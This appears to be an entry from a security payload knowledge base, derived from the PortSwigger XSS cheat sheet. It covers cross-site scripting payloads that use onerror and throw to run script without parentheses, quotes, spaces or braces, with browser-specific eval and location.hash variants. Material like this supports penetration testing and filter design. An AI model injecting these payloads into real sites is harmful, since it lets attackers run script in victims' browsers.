---
title: No-Parentheses XSS via throw / onerror
slug: no-parens-throw-onerror
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/js-string, sink/restricted-chars]
inbound: []
---

# No-Parentheses XSS via throw / onerror

## Payload

```javascript
<script>onerror=alert;throw 1</script>
```

## Variants

```javascript
// No semicolons
<script>{onerror=alert}throw 1</script>

// Comma expression
<script>throw onerror=alert,1</script>

// String eval on Chrome/Edge
<script>throw onerror=eval,'=alert\x281\x29'</script>

// String eval on Safari
<script>throw onerror=eval,'alert\x281\x29'</script>

// Object eval on Firefox
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>

// Object eval on Firefox/Safari (Error object)
<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>

// Location hash eval (all browsers)
<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>

// No parens, no quotes, no spaces
<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>

// No parens, no quotes, no spaces, no curly brackets
<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>
```

## Context

Applies when `(` and `)` are stripped or blocked in a JS string injection context (script block or event handler). Assigning `alert` to `window.onerror` and throwing any value calls `alert` with the thrown value as the message argument. The `eval` variants use the `onerror` message string as the eval target — browser-specific: Chrome/Edge expect `=alert(1)` prefix due to the "Uncaught" prefix prepended; Safari expects plain `alert(1)`. The `location.hash` form carries the payload out-of-band. The no-quotes / no-curly-brackets forms use `Error` constructor property assignments. Sink: script injection context.

## Provenance

- Distilled from: `../../techniques/dom-xss/restricted-character-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Restricted Character Bypass](../../techniques/dom-xss/restricted-character-bypass.md)
